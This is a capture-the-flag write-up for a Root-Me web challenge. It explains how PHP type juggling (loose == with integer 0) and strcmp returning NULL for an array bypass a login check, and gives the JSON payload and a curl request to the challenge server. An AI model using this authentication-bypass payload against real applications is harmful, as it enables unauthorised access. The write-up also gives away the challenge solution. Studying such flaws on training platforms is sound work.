According to the source code, we are going to try to bypass:

```
if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256))
```
To do this, we must validate both parts of the expression. $auth['data']['login'] being a string, we can compare it to 0, and the result will be True.

To have **!strcmp($auth['data']['password'], $PASSWORD_SHA256) = True**, we must have  **strcmp($auth['data']['password'], $PASSWORD_SHA256)=False**.

Well, we can read the documentation of the strcmp function, and see that it returns NULL if we pass an array in arguments.

Now, we know that if we send

```
{"data":{"login":0,"password":[]}}
```
 to the page, we should bypass the authentication. But how to send json ? The form will send a json of strings, and it is really important for us to send an integer in "login".

We can use a interceptor, like the Burp Suite, or create a request with curl:

```
curl -X POST "http://challenge01.root-me.org/web-serveur/ch44/auth.php" --data 'auth={"data":{"login":0,"password":[]}}'
```

which returns:

```
{"status":"Access granted! The validation password is: FLAG"}
```
